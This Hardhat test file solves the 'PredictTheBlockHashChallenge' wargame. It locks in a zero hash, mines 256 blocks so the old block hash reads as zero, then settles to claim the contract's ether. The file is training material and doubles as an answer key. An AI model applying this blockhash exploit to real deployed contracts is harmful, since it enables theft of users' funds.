import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils } = ethers;

describe('PredictTheBlockHashChallenge', () => {
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;
  let target: Contract;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('PredictTheBlockHashChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    /**
     * YOUR CODE HERE
     * */


    // no hack contract wait 256 blocks thats as far as you can access the hases and then all other values will be 0

    const lockInGuessTx = await target.lockInGuess("0x0000000000000000000000000000000000000000000000000000000000000000",{value: utils.parseEther('1')});
    await lockInGuessTx.wait();

    const initBlockNumber = await ethers.provider.getBlockNumber();

    let lastBlockNumber = initBlockNumber;
    do {
      lastBlockNumber = await ethers.provider.getBlockNumber();
  
      await ethers.provider.send('evm_mine', []);
    } while (lastBlockNumber - initBlockNumber < 256);

    const guess = await target.settle();
    await guess.wait();




    expect(await target.isComplete()).to.equal(true);
  });
});
